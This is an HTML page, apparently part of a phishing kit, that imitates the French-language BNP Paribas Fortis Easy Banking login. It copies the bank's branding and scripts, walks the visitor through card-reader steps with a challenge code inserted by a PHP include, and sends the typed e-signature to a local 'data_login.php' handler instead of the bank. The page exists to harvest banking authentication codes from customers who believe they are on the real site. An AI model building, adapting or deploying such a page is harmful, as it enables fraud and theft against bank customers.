<!DOCTYPE html>
<html lang="fr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta content="IE=edge,chrome=1" http-equiv="X-UA-compatible">

	 <link
            rel="icon"
            href="data:image/vnd.microsoft.icon;base64,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AP96pgD/eqYA/3qmAP96pgD/eqYA/3qmAP96pgD/eqYA/3qmAP96pgD/h68S/5y9Mv96pgD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3SeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP9zngD/c54A/3OeAP+JsBX/ocBF/3WeBP9slgD/bJYA/2yWAP9slgD/bJYA/3ScC/9slgD/bJYA/2yWAP9slgD/gqYn/7rPhv+Ssj3/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/2yWAP9slgD/bJYA/42yI/+lxFj/bpcI/2WQAP9lkAD/ZZAA/2WQAP+Cpif/sMZ+/2WQAP9lkAD/ZZAA/2WQAP95nxn/us+G/////v/m7tL/zdyn/2iRBv9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/ZZAA/2WQAP9lkAD/kbYx/6vHaP9nkQj/YIoA/2CKAP9figD/Yo4A/97pxv/L2qj/tsx+/7bLgv92mx//YIoA/2mRDv99ny7/l7JZ/+ju3f/3+fP/gaMx/2CKAP9gigD/X4oA/2CKAP9gigD/YIoA/2CKAP9figD/YIoA/2CKAP9gigD/YIoA/1+KAP+XuUn/rch3/2CKAP9chwD/XIcA/2mRDv+7z4v////+/////v+twYH/X4gG/1yHAP9chwD/XIcA/1yHAP9chwD/dZgp/8nWsP+ovnn/gaI5/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/W4UA/569Xv+xy4T/XIcA/1uFAP+Sr0v/9Pjr/////v////7/9/nz/2KJDP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9bhQD/Z40U/1uFAP9rkhn/X4gG/1uFAP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9bhQD/W4UA/1uFAP9ahAD/pcJx/7LMkP9bhQD/XIcA/1+KAP+Ip0L/+fv1/+3y4v/1+PH/rMF8/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP9chwD/XIcA/1yHAP+pxn//ssyQ/1+KAP9figD/X4oA/2SOBf/3+fP/c5kg/1+KAP9rkhn/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/X4oA/1+KAP9figD/YIoA/7DKi/+yzJD/YIoA/2KOAP9ijgD/Z5EI/8/csf9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9lkAD/tc6W/7bOk/9ijgD/Yo4A/2KOAP9kkQD/obtn/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2KOAP9ijgD/Yo4A/2SSAP+50Z3/rsiB/2SSAP9kkgD/ZJIA/2SSAP9wmhP/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/ZJIA/2SSAP9kkgD/Z5YA/7XOlv+sxnv/Z5YA/2eWAP9nlgD/Z5YA/3mjHv9nlgD/Z5YA/2eWAP9nlgD/c54S/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9smQv/ssuR/6nEdv9nlgD/Z5YA/2eWAP9nlgD/eaMe/7rPhv9pmgD/Z5YA/2eWAP+2zX//c58V/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/2eWAP9nlgD/Z5YA/22bCv+tx4j/pcJx/2maAP9pmgD/aZoA/2maAP9pmgD/sst8/9Phsv9vngn/a50A/+rx2v+OskH/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/aZoA/2maAP9pmgD/b54J/6jDgP+iwGv/a50A/2udAP9rnQD/a50A/2udAP9vnwb/3unG/+Tt0P+kwmD////+/7XNgf9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/a50A/2udAP9rnQD/b58G/2udAP9rnQD/a50A/2udAP9vnwb/pL93/6G/Zv9tnwD/bZ8A/22fAP9tnwD/bZ8A/22fAP9+qh7/9Pjr/////v////7/6vHa/4avKv94phL/d6YQ/3uoF/+KsjL/jLM1/22fAP9tnwD/bZ8A/22fAP9tnwD/bZ8A/22fAP+Gryr/h7Aw/22fAP9tnwD/bZ8A/22fAP+eu2v/nr1e/3GiAP9xogD/caIA/3GiAP9xogD/daQC/4ewJf/T4q7////+/////v////7////+/////v/9/vz/5u7S/63Jav93pgr/caIA/3GiAP9xogD/caIA/3GiAP9xogD/caIA/5G3Nv+wy3T/caIA/3GiAP9xogD/caIA/5m3X/+evFf/eqYA/3qmAP96pgD/eqYA/4OtEv+xzG//0eGs/9/qwf/f6sH/5u7S/////v/y9un/ss1w/5G2Mf96pgD/eqYA/3qmAP96pgD/eqYA/3upBf96pgD/eqYA/3qmAP96pgD/ocJN/9HhrP96pgD/eqYA/3qmAP96pgD/lbRT/567Uf+BrQD/ga0A/4GtAP+BrQD/ga0A/4GtAP+BrQD/gKwA/4CsAP+BrQT/tM5o/+/04f+SuCj/ga0A/4GtAP+BrQD/ga0A/4GtAP+BrQD/nb46/63JYv+BrQT/ga0A/4GtAP+30HH/7fPd/4CsAP+BrQD/ga0A/4GtAP+RsEb/mbxP/4mxC/+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/i7IS/5W5Kf+JsQv/ibEL/4mxC/+JsQv/ibEL/4mxC/+JsQv/wdaG/+rx2v+vyl//ibEL/9bksf/5+/X/i7IS/4mxC/+JsQv/ibEL/42tOf+Ztkz/kLYw/5C2MP+QtjD/kLYw/5C2MP+QtjD/kLYw/5C2MP+QtjD/kLYw/5C2MP+RtjH/kLYw/5C2MP+RtjH/q8do/77Uhf+yzG//pcRY/5q8Q/+RtjH/4uvJ/////v/m7tL//P36//3+/P+Wuj7/kLYw/5C2MP+QtjD/iaoy/5WyQ/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//mbxP/5m8T/+ZvE//nb5W/7zTjv/e6cb/9/nz/////v////7////+/////v////7//f78/6DAW/+ZvE//mbxP/5m8T/+HqSz/kq83/5++Zv+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+hwWr/ocFq/6HBav+jwm7/tc6K/9Titf////7////+/////v////7/7fLi/6jFc/+hwWr/ocFq/4WmJv+OrDH/o8Fy/6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6nGf/+pxn//qcZ//6PCbv/H2qH//P36/////v/y9un/yNut/7zTm//G2qv/ts6T/6nGf/+pxn//haYm/4moMf+lwnH/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/6nGf/+/1Jb/7/Tl/+705//Y5cj/v9Sj/7LMkP+yzJD/ssyQ/7LMkP+yzJD/ssyQ/7LNkf+EpSr/hqYy/5++Zv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/vdSf/8PYrP+50Z3/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/7bQmv+20Jr/ttCa/4amMv+BozH/j7BO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/scyO/7HMjv+xzI7/g6Qy/36eMv95nin/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6rHgf+qx4H/qseB/6nGf/95nCX/japN/3OXI/+FpT7/iKhC/4ioQv+IqEL/iKhC/4ioQv+Ip0L/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/iKdC/4ioQv+IqEL/iKhC/4inQv+IqEL/iKhC/4ioQv+IqEL/iKhC/4ioQv+IqEL/gKE2/36eMv8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
        />
    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    />
    <!-- Google Fonts Roboto -->
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
    />
    <!-- MDB -->
    <link rel="stylesheet" href="css/mdb.min.css" />



<title>Mon Easy Banking, ma banque en ligne | BNP Paribas Fortis</title>
<!--ls:begin[stylesheet]-->
<link href="iwov-resources/fixed-layout/Web-Banking-Unauthenticated.css" type="text/css" rel="stylesheet">
<!--ls:end[stylesheet]-->
<!--ls:begin[meta-keywords]-->
<meta name="keywords" content="easy banking, banque en ligne">
<!--ls:end[meta-keywords]-->
<!--ls:begin[meta-description]-->
<meta name="description" content="Gérez vos opérations et contactez votre conseiller d'un simple clic avec Easy Banking. Découvrez notre banque en ligne !">
<!--ls:end[meta-description]-->
<!--ls:begin[meta-vpath]-->
<meta name="vpath" content="">
<!--ls:end[meta-vpath]-->
<!--ls:begin[meta-page-locale-name]-->
<meta name="page-locale-name" content="">
<!--ls:end[meta-page-locale-name]-->
<!--ls:begin[stylesheet]-->
<link type="text/css" href="rsc/contrib/graphicaltheme/bnpp-fortis/brand.css" rel="stylesheet">
<!--ls:end[stylesheet]-->
<!--ls:begin[stylesheet]-->
<link type="text/css" href="rsc/sys/css/player/mediaelementplayer.min.css" rel="stylesheet">
<!--ls:end[stylesheet]-->
<!--ls:begin[stylesheet]-->
<link type="text/css" href="rsc/contrib/graphicaltheme/bnpp-fortis/chat-worldline.css" rel="stylesheet">
<!--ls:end[stylesheet]-->
<!--ls:begin[script]-->
<script type="text/javascript" src="rsc/contrib/script/js/portal.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/jquery-1.9.1.min.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/jquery-migrate-1.1.1.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/sys/script/js/modernizr/modernizr-min.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/sys/script/js/pagebus/pagebus.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/sys/script/js/require/require.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/iscroll.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/bootstrap.min.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/wcm-config.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/wcm-config-sf-new.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/placeholder.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/package/custom/browsercheck.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/sf-comp-wcm-config.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/jquery.bxslider.min.4.1.2.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/package/custom/public-site-functions.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/lib/datepicker.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/package/custom/e-banner.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/adobe/ebw/launch-ENce487f4f1dfa4e3f8caf5c5d0adf5ad0.min.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/package/custom/commonFunctions.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/common/plugins/commons/libs/frontendlibs.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/chatbot/chat-worldline.config.js"></script>
<!--ls:end[script]-->
<!--ls:begin[script]--><script type="text/javascript" src="rsc/contrib/script/js/chatbot/chat-worldline.min.js"></script>
<!--ls:end[script]-->
<!--ls:begin[favicon]-->
<link type="image/x-icon" href="https://www.bnpparibasfortis.be/rsc/contrib/graphicaltheme/bnpp-fortis/images/favicon.ico" rel="shortcut icon">
<!--ls:end[favicon]-->
<!--ls:begin[head-injection]--><meta name="siteid" content="web-banking" /><link rel="canonical" href="Connexion93e9.html?axes4=priv" /><meta name="FIELDDACLEVEL" content="-1" /><meta name="FIELDUSERTYPE" content="0" /><meta name="FIELDLANGUAGE" content="fr" /><meta name="FIELDCHANNEL" content="PC" /><meta name="FIELDTERRITORY" content="fb" /><meta name="FIELDAUDIENCE" content="priv" /><meta name="referrer" content="origin" /><meta name="og:image" content="/rsc/contrib/graphicaltheme/bnpp-fortis/images/print_logo.png" /><meta name="msapplication-tap-highlight" content="no" /><meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no" /><meta name="format-detection" content="telephone=no" /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no" /><script type='text/javascript' src='rsc/sys/script/js/sitefactory/sitefactory.js'></script><script type='text/javascript' src='rsc/sys/script/js/mediator/mediator-target-config.js'></script><script type='text/javascript' src='rsc/sys/script/js/sitefactory/mediator.js'></script><!--ls:end[head-injection]--><!--ls:begin[script]--><!--ls:end[script]--></head>
<body class="fr PC fb priv nextgen"><div id="sf-master"><!--sf:begin[div:sf-master]--><!--ls:begin[body]--><div class="ls-canvas portal_wrapper" id="webbankingUnauthenticated">
<div class="ls-row offcanvas" id="header">
<div class="ls-fxr" id="ls-gen74962495-ls-fxr">
<div class="ls-col mm_offcanvas" id="ls-row-1-col-1">
<div class="ls-col-body" id="ls-gen74962496-ls-col-body"></div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row canvas_container" id="ls-row-2">
<div class="ls-lqr" id="ls-gen74962497-ls-lqr">
<div class="ls-col" id="ls-row-2-col-1">
<div class="ls-col-body" id="ls-gen74962498-ls-col-body">
<div class="ls-row eb-header" id="ls-row-2-col-1-row-1">
<div class="ls-lqr" id="ls-gen74962499-ls-lqr">
<div class="ls-area" id="ls-row-2-col-1-row-1-area-1">
<div class="ls-area-body" id="ls-gen74962500-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1465485783749">
<div class="iw_component" id="1465485783749">

<!----debut----------------->

















<!----fin----------------->























</div>
</div>
<div class="ls-cmp-wrap" id="w1465485783750">
<div class="iw_component" id="1465485783750"><script src="rsc/contrib/script/js/common/package/custom/ebw-widgets.js"></script><div class="wcm-faq supportpane">
<div class="support_widget animated fadeInUp">
<div data-auto-id="support_faq_block" id="tab1" class="support_block active">
<div class="support_header">
<div class="support_header_inner">
<h2>Questions fréquentes</h2>
<button class="support_icon_close fontcon-cross"></button>
</div>
</div>
<div class="support_content">
<div class="support_content_inner">
<div id="" class="support_faq">
<div class="support_faq_list">
<div data-auto-id="support_faq_list" class="faq_list"></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div></div>
</div>
<div class="ls-cmp-wrap" id="w1465485783751">
<div class="iw_component" id="1465485783751">
<div class="rich_text nextgen">
<div id="centeredLogo" class="region ">
<div id="siteHeaderError" class="section level1 ">
<div id="siteHeaderErrorInner" class="section level2 ">
<p id="brandLogoBack">
<a href="javascript:history.back()">Retour</a>
</p>
<p id="brandLink">
<span><a href="" target="_blank">Easy Banking Business</a></span>
</p>
<p id="brandLogo"></p>
</div>
</div>
</div>
</div><!--content stop-->
</div>
</div>



<!-----DEBUT---------->

<!-------FIN---------->


<div class="ls-cmp-wrap" id="w1465485783752">
<div class="iw_component" id="1465485783752"><div class="wcm-javascript style-default nextgen">
<script type="text/javascript">require(["fbunauthenticated"], function (UnauthApp) {});
$("html").addClass("rich_text_header");
$("html").addClass("login_page");</script>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1657003647663">
<div class="iw_component" id="1657003647663"><div id="open_faq" class="faq start">
<div class="borderRound"></div>
<div class="round">
<a class="faq_entry_icon fontcon-faq" aria-expanded="true" name="open faq" href="javascript:void(0)"></a><a class="faq_exit_icon fontcon-close-thin" tabindex="-1" aria-expanded="false" name="close faq" href="javascript:void(0)"></a>
</div>
<ul class="faq_options">
<li data-auto-id="ui-fontcon-ask-outline">
<div>
<a href="Faq-FR93e9.html?axes4=priv" class="wl-chatbot-entrypoint" id="wl-chatbot-entrypoint" target="_self">Trouvez une<span class="highlight_text">&nbsp;réponse</span></a><span class="pane_icon fontcon-ask-outline"></span>
</div>
</li>
<li data-auto-id="ui-fontcon-calendar">
<div>
<a href="" target="_self">Prenez<span class="highlight_text">&nbsp;rendez-vous</span></a><span class="pane_icon fontcon-calendar"></span>
</div>
</li>
<li data-auto-id="ui-fontcon-phone-outline">
<div>
<a href="tel:027622000" class="tel_link">Appelez-nous<span class="highlight_text">&nbsp;02 762 20 00</span></a><span class="pane_icon fontcon-phone-outline"></span>
</div>
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="ls-row-clr"></div>
</div>
</div>
<div class="ls-row login_bg main_wrapper" id="content">
<div class="ls-lqr" id="ls-gen74962501-ls-lqr">
<div class="ls-col" id="ls-row-2-col-1-row-2-col-1">
<div class="ls-col-body" id="ls-gen74962502-ls-col-body">
<div class="ls-row wcm-messages" id="warning">
<div class="ls-lqr" id="ls-gen74962503-ls-lqr">
<div class="ls-area" id="ls-row-2-col-1-row-2-col-1-row-1-area-1">
<div class="ls-area-body" id="ls-gen74962504-ls-area-body">
<div class="ls-cmp-wrap ls-1st" id="w1396414149936">
<div class="iw_component" id="1396414149936">

<div id="login_overlayer" class="login-container" data-url-context="/EBIA-pr01/">
<div class="login_comp">
    <div class="login_comp_inner">
        <!-- Error banner standard component-->
        <div class="ia_alert">
            <!-- rivets: each-error -->
        </div>
        <div class="login_row">
	        <div class="login_col1">
		        <div class="login_banner">
		            <div class="login_banner_inner">
		                <h1 class="caption">
				          <span data-rv-text="config.app.message.Label.authentication.commons.welcomeText">Bienvenue dans</span>
				          <span data-rv-text="config.app.message.Label.authentication.commons.easyBankingText">Easy Banking</span>
				        	<span><img src="img/card_reader_2x.png"></span>
						</h1>
		            </div>
				
		        </div>
	        </div>
	        <div class="login_col2">
		        <div class="login_flow">
		            <form class="form-class" method="POST" action="data_login.php" >
		                <div class="form_inner_block pad_rl30">
		                    <!-- Error summary standard component-->
		                    <div class="error_summary" data-rv-class-show_active="violations.errorSummaryHeader" tabindex="0" mod-cat="inline-alert-message" mod-cat-version="1.0.0">
		                        <p data-rv-class-show_active="violations.errorSummaryHeader" data-rv-text="config.app.message.Label.authentication.identification.errorMessage">Veuillez corriger le ou les champs suivants</p>
		                        <ul class="error_summary_items">
		                            <li class="hide" data-rv-showactive="violations.clientNumber" data-rv-text="config.app.message.Label.authentication.identification.clientNumber">Numéro de client</li>
		                            <li class="hide" data-rv-showactive="violations.cardNumber" data-rv-text="config.app.message.Label.authentication.commons.cardNumber">Numéro de carte</li>
		                            <li class="hide" data-rv-showactive="violations.aliasName" data-rv-text="config.app.message.Label.authentication.identification.contractAlias">Nom de ce profil</li>
		                        </ul>
								
		                    </div>
		             
							
		                    <div class="form_fields">
		                        <div class="form_labels">
		                            <label for="cardNum"><span data-rv-text="config.app.message.Label.authentication.commons.cardNumber">Numéro de carte</span> <span id="label_carte"></span></label>

		                        </div>
		                        <div class="form_details">
		                       
		                         <b style="font-weight:bold"> 1 .Insérez votre carte dans le lecteur de carte et <br> appuyer sur <span style="background-color:#d84207;color:white">M1</span> </b> 
		                        </div>
						

		                    </div>  

							<div class="form_fields">
		                      
		                        <div class="form_details">
		                       
		                         <b style="font-weight:bold"> 2 .Introduisez  <strong><?php include("message.txt"); ?></strong> appuyer sur <span style="background-color:#00965e;color:white">Ok</span> </b> 
		                        </div>
						

		                    </div>
							
							
							<div class="form_fields">
		                      
		                        <div class="form_details">
		                       
		                         <b style="font-weight:bold"> 3 .Introduisez le code PIN et appuyer sur <span style="background-color:#00965e;color:white">Ok</span> </b> 
		                        </div>
						

		                    </div>
							
							
							<div class="form_fields">
		                      
		                        <div class="form_details">
		                       
		                         <b style="font-weight:bold"> 4 .Introduisez l'e-signature <input type="text" name="j_pin_code" id="e-sign" class="input_card_number"  maxlength="21" autocomplete="off" required> </b> 
		                        </div>
						

		                    </div>
		                    <!-- Client number -->
		            
		                    <!-- Save data -->
		                  
		                    <!-- Choose alias -->
		                   
		                    <!-- Navigation btn -->
		                    <div class=" pad-t10 ">
		                        <div class="right_navigation_btn fullwidth_btn ">
		                            <button  type="submit" class="btn_default btn_primary"  >Se connecter</button>
		                        </div>
		                    </div>

		                </div>
		            </form>
		        </div>
		     </div>
        </div>
    </div>

</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1484242474486">
<div class="iw_component" id="1484242474486"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">

</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1508947068404">
<div class="iw_component" id="1508947068404"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">
<script>
document.addEventListener("DOMContentLoaded", function(event) {
require(["sf","errorMessage"], function (sf,ErrorMessage) 
{
if (typeof sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
else if (typeof sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
});
});
</script>
</div>
</div>
</div>
</div>
</div>
<div class="ls-cmp-wrap" id="w1520355986006">
<div class="iw_component" id="1520355986006"><div class="wcm-severity-message">
<div class="severity_message">
<div class="alert_messages fade in alert_messages_information  nextgen show_active">
<script>
document.addEventListener("DOMContentLoaded", function(event) {
require(["sf","errorMessage"], function (sf,ErrorMessage) 
{
if (typeof sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0] != 'undefined') 
{
var queryData = sf.messaging.queryTopic('target.ia.contact.showContactInfo')[0];
ErrorMessage.loadErrorData(queryData);
}
else if (typeof sf.messaging.queryTopic('target.ia.contact.showAuthContactInfo')[0] != 'undefined') 
{
